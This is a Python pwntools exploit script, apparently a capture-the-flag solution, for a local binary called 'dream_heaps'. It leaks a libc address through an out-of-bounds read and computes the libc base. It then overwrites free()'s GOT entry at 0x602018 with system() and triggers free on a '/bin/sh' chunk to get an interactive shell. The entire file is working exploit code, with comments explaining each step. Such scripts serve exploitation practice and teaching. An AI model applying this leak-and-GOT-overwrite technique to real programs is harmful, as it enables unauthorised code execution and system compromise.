from pwn import *

target = process("./dream_heaps")
libc = ELF('/usr/lib/libc.so.6')

def write(contents, size):
    print(target.recvuntil('> '))
    target.sendline('1')
    print(target.recvuntil('dream?'))
    target.sendline(str(size))
    print(target.recvuntil('dream?'))
    target.send(contents)

def read(index):
    print(target.recvuntil('> '))
    target.sendline('2')
    print(target.recvuntil('read?'))
    target.sendline(str(index))
    leak = target.recvuntil("What")
    leak = leak.replace(b"What", b"")
    leak = leak.replace(b"\x0a", b"")
    leak = leak + b"\x00"*(8 - len(leak))
    leak = u64(leak)
    log.info("Leak is: " + hex(leak))
    return leak

def edit(index, contents):
    print(target.recvuntil('> '))
    target.sendline('3')
    print(target.recvuntil('change?'))
    target.sendline(str(index))
    target.send(contents[:6])

def delete(index):
    print(target.recvuntil('> '))
    target.sendline('4')
    print(target.recvuntil('delete?'))
    target.sendline(str(index))

# getting the libc infoleak
puts = read(-263021)
libcBase = puts - libc.symbols['puts']

# GOT table entry for free() function (from libc) is here overwritten by absolute address of system() (also from libc)
write('/bin/sh\x00', 0x10)
write('0'*10, 0x20)
write('0'*10, 0x30)
write('0'*10, 0x40)
write('0'*10, 0x50)
write('0'*10, 0x60)
write('0'*10, 0x70)
write('0'*10, 0x80)
write('0'*10, 0x90)
write('0'*10, 0xa0)
write('0'*10, 0xb0)
write('0'*10, 0xc0)
write('0'*10, 0xd0)
write('0'*10, 0xe0)
write('0'*10, 0xf0)
write('0'*10, 0x11)
write('0'*10, 0x22)
write('0'*10, 0x18)
write('0'*10, 0x602018)    # 0x602018 is GOT entry address of free()
write('0'*10, 00)

# writing absolute libc address of system() into GOT entry for free(), so that when free() is called in delete(0), it runs system() with '/bin/sh' as argument
edit(17, p64(libcBase + libc.symbols['system']))

# time to call free(), which has now due to changes to its GOT absolute address become system()
delete(0)

target.interactive()
